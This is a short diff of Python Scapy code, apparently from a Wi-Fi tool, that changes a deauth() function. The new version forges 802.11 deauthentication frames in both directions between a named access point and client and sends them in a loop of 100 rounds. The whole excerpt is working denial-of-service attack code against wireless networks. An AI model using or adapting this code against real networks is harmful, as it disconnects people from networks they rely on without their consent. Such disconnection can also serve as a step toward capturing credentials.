@@ -13,11 +13,16 @@ def check_deauth(pkt):
 
 
 def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
-    packet = RadioTap() / \
+    packet1 = RadioTap() / \
         Dot11(type=0, subtype=12, addr1=BSSID, addr2=client, addr3=client) / \
         Dot11Deauth(reason=reason)
+    packet2 = RadioTap() / \
+        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
+        Dot11Deauth(reason=reason)
     print(f'SENDING DEAUTH to {BSSID}')
-    sendp(packet, iface=iface, count=64, inter=0.1)
+    for i in range(100):
+        sendp(packet1, iface=iface, count=1)
+        sendp(packet2, iface=iface, count=1)
 
 
 def deauth_clients(iface: str, wifi: Wifi, reasoncode: int = 6):
